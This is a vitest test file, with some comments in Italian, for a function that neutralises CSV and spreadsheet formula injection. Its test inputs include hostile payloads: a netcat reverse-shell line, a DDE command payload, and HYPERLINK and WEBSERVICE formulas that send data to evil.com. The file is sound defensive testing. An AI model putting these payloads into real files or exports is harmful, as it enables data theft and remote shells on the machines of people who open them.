/**
 * Test P0-4: CSV Injection Prevention
 *
 * Verifica che le celle CSV pericolose vengano sanitizzate
 */

import { describe, it, expect } from 'vitest';
import { writeFile, unlink } from 'fs/promises';
import { join } from 'path';

// Import sanitization function (adjust path as needed)
// Per ora testiamo la logica direttamente
function sanitizeCSVCell(value: string): string {
  if (!value || typeof value !== 'string') {
    return value;
  }

  const trimmed = value.trim();
  const dangerousChars = ['=', '+', '-', '@', '|', '%', '\t', '\r'];

  if (dangerousChars.some((char) => trimmed.startsWith(char))) {
    return `'${trimmed}`;
  }

  return trimmed.replace(/[\r\t]/g, ' ');
}

describe('CSV Injection Prevention (P0-4)', () => {
  it('should sanitize cells starting with =', () => {
    const dangerous = '=1+1';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'=1+1");
    expect(safe.startsWith("'")).toBe(true);
  });

  it('should sanitize cells with Excel HYPERLINK formula', () => {
    const dangerous = '=HYPERLINK("http://evil.com","Click me")';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe('\'=HYPERLINK("http://evil.com","Click me")');
  });

  it('should sanitize cells starting with +', () => {
    const dangerous = '+2+2';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'+2+2");
  });

  it('should sanitize cells starting with -', () => {
    const dangerous = '-1';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'-1");
  });

  it('should sanitize cells starting with @', () => {
    const dangerous = '@SUM(A1:A10)';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'@SUM(A1:A10)");
  });

  it('should sanitize cells starting with |', () => {
    const dangerous = '|nc -e /bin/sh 192.168.1.1 4444';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'|nc -e /bin/sh 192.168.1.1 4444");
  });

  it('should sanitize cells starting with %', () => {
    const dangerous = '%appdata%';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'%appdata%");
  });

  it('should NOT sanitize normal cells', () => {
    const normal = 'Normal text';
    const result = sanitizeCSVCell(normal);
    expect(result).toBe('Normal text');
  });

  it('should NOT sanitize numbers', () => {
    const number = '123.45';
    const result = sanitizeCSVCell(number);
    expect(result).toBe('123.45');
  });

  it('should handle empty strings', () => {
    const empty = '';
    const result = sanitizeCSVCell(empty);
    expect(result).toBe('');
  });

  it('should handle whitespace-only strings', () => {
    const whitespace = '   ';
    const result = sanitizeCSVCell(whitespace);
    expect(result).toBe('');
  });

  it('should sanitize cells with formula after trim', () => {
    const dangerous = '  =1+1  '; // Leading/trailing spaces
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'=1+1");
  });

  it('should remove tab and carriage return from middle of string', () => {
    const dangerous = 'value\twith\ttabs\rand\rcarriage\rreturns';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe('value with tabs and carriage returns');
    expect(safe).not.toContain('\t');
    expect(safe).not.toContain('\r');
  });

  it('should handle multiple dangerous chars in sequence', () => {
    const dangerous = '=+@|dangerous';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe("'=+@|dangerous");
  });

  it('should preserve normal hyphen in middle of text', () => {
    const normal = 'Rome-Paris'; // Hyphen in middle, not at start
    const result = sanitizeCSVCell(normal);
    expect(result).toBe('Rome-Paris'); // Should NOT be prefixed
  });

  it('should sanitize DDE attack', () => {
    const dde = '=cmd|' + "'/c calc'!A1";
    const safe = sanitizeCSVCell(dde);
    expect(safe).toBe("'=cmd|'/c calc'!A1");
  });

  it('should sanitize LibreOffice command injection', () => {
    const dangerous = '=WEBSERVICE("http://evil.com/steal?data="&A1)';
    const safe = sanitizeCSVCell(dangerous);
    expect(safe).toBe('\'=WEBSERVICE("http://evil.com/steal?data="&A1)');
  });
});

describe('CSV Parsing Integration', () => {
  const testFilePath = join(process.cwd(), 'test-csv-injection.csv');

  it('should parse and sanitize malicious CSV file', async () => {
    // Create malicious CSV
    const maliciousCSV = [
      'name,value,formula',
      'Alice,100,=1+1',
      'Bob,200,@SUM(A1:A10)',
      'Charlie,300,Normal text',
    ].join('\n');

    await writeFile(testFilePath, maliciousCSV, 'utf-8');

    // Parse CSV (use actual parseCSV function from your code)
    // For now, simulate parsing
    const lines = maliciousCSV.split('\n');
    const headers = lines[0].split(',');
    const row1 = lines[1].split(',').map(sanitizeCSVCell);
    const row2 = lines[2].split(',').map(sanitizeCSVCell);
    const row3 = lines[3].split(',').map(sanitizeCSVCell);

    // Verify sanitization
    expect(row1[2]).toBe("'=1+1"); // Formula sanitized
    expect(row2[2]).toBe("'@SUM(A1:A10)"); // Formula sanitized
    expect(row3[2]).toBe('Normal text'); // Normal text unchanged

    // Cleanup
    await unlink(testFilePath).catch(() => {});
  });
});
